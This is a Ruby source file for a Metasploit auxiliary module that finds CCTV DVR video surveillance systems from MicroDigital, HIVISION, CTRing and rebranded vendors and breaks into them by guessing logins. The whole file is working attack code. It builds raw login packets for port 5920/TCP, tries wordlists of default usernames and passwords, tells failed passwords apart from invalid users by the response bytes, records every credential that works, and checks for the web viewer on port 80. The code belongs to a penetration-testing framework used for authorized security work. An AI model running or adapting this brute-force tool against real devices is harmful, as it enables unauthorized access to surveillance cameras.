##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Tcp
	include Msf::Auxiliary::AuthBrute
	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::Report

	def initialize
		super(
			'Name'        => 'CCTV DVR Login Scanning Utility',
			'Description' => %q{
				This module tests for standalone CCTV DVR video surveillance
				deployments specifically by MicroDigital, HIVISION, CTRing, and
				numerous other rebranded devices that are utilizing default vendor
				passwords. Additionally, this module has the ability to brute
				force user accounts.

				Such CCTV DVR video surveillance deployments support remote
				viewing through Central Management Software (CMS) via the
				CMS Web Client, an IE ActiveX control hosted over HTTP, or
				through Win32 or mobile CMS client software. By default,
				remote authentication is handled over port 5920/TCP with video
				streaming over 5921/TCP.

				After successful authentication over 5920/TCP this module
				will then attempt to determine if the IE ActiveX control
				is listening on the default HTTP port (80/TCP).
			},
			'Author'      => 'Justin Cacak',
			'License'     => MSF_LICENSE
		)

		register_options(
		[
			OptPath.new(
				'USER_FILE',
				[
					false,
					"File containing usernames, one per line",
					File.join(Msf::Config.install_root, "data", "wordlists", "multi_vendor_cctv_dvr_users.txt")
				]),
			OptPath.new(
				'PASS_FILE',
				[
					false,
					"File containing passwords, one per line",
					File.join(Msf::Config.install_root, "data", "wordlists", "multi_vendor_cctv_dvr_pass.txt")
				]),
			OptBool.new('STOP_ON_SUCCESS', [false, "Stop guessing when a credential works for a host", true]),
			OptPort.new('HTTP_PORT', [true, "The HTTP port for the IE ActiveX web client interface", 80]),
			Opt::RPORT(5920)
		], self.class)
	end

	def run_host(ip)
		@valid_hosts = []
		begin
			connect

			each_user_pass { |user, pass|
				do_login(user, pass)
			}
		rescue ::Interrupt
			raise $!
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
			print_error("Timeout or no connection on #{rhost}:#{rport}")
			return
		rescue ::Exception => e
			print_error("#{rhost}:#{rport} Error: #{e.class} #{e} #{e.backtrace}")
			return
		ensure
			disconnect
		end

		@valid_hosts.each do |h|
			http_interface_check(h)
		end

	end

	def http_interface_check(h)
		begin
			http = connect(false, {
				'RPORT' => datastore['HTTP_PORT'],
				'RHOST' => h
			})

			http.put("GET / HTTP/1.1\r\n\r\n")

			# get() is a more suitable method than get_once in this case
			data = http.get(20)

			if data =~ /DVR WebViewer/i
				#Confirmed ActiveX control over HTTP, display the control name and version
				#Report HTTP service info since there is a confirmed IE ActiveX control
				#Code base example:
				#codebase="CtrWeb.cab#version=1,1,5,4"
				if data.match(/codebase="(\w{1,16})\.(\w{1,3}).version=(\d{1,3},\d{1,3},\d{1,3},\d{1,3})/)
					v   = "#{$1}.#{$2} v#{$3}"
				else
					v   = "unknown version"
				end

				uri = "http://#{rhost}:#{datastore['HTTP_PORT']}"
				print_status("Confirmed IE ActiveX HTTP interface (#{v}): #{uri}")

				report_service(
					:host => rhost,
					:port => datastore['HTTP_PORT'],
					:name => "http",
					:info => "IE ActiveX CCTV DVR Control (#{v})"
				)
			else
				#An HTTP server is listening on HTTP_PORT, however, does not appear to be
				#the ActiveX control
				print_status("An unknown HTTP interface was found on #{datastore['HTTP_PORT']}/TCP")
			end

		rescue
			print_status("IE ActiveX HTTP interface not found on #{datastore['HTTP_PORT']}/TCP")
		ensure
			disconnect(http)
		end
	end

	def do_login(user=nil, pass=nil)
		vprint_status("#{rhost} - Trying username:'#{user}' with password:'#{pass}'")

		fill_length1 = 64 - user.length

		#Check if user name length is too long for submission (exceeds packet length)
		if fill_length1 < 1
			return
		end

		#Build the authentication packet starting here
		data = "\x00\x01\x00\x00\x80\x00\x00\x00" + user + ("\x00" * fill_length1)

		#Check if password length is too long for submission (exceeds packet length)
		fill_length2 = 64 - pass.length
		if fill_length2 < 1
			return
		end

		data = data + pass + ("\x00" * fill_length2)
		res = nil
		sock.put(data)
		begin
			res = sock.get_once(-1, 7)
		rescue
			return :abort
		end

		if not (res)
			disconnect
			vprint_error("#{rhost}  No Response")
			return :abort
		end

		#Analyze the response
		if res == "\x00\x01\x03\x01\x00\x00\x00\x00"  #Failed Password
			vprint_error("#{rhost}:#{rport}  Failed login as: '#{user}'")
			return

		elsif res =="\x00\x01\x02\x01\x00\x00\x00\x00" #Invalid User
			vprint_error("#{rhost}:#{rport}  Invalid user: '#{user}'")
			#Stop attempting passwords for this user since it doesn't exist
			return :skip_user

		elsif res =="\x00\x01\x05\x01\x00\x00\x00\x00" or res =="\x00\x01\x01\x01\x00\x00\x00\x00"
			print_good("#{rhost}:#{rport}  Successful login: '#{user}' : '#{pass}'")

			# Report valid credentials under the CCTV DVR admin port (5920/TCP).
			# This is a proprietary protocol.
			report_auth_info(
				:host         => rhost,
				:port         => rport,
				:sname        => 'cctv_dvr',
				:user         => user,
				:pass         => pass,
				:source_type  => "user_supplied",
				:duplicate_ok => false,
				:active       => true
			)

			@valid_hosts << rhost
			return :next_user

		else
			vprint_error("#{rhost}:#{rport}  Failed login as: '#{user}' - Unclassified Response: #{res.inspect}")
			return
		end

	end

end
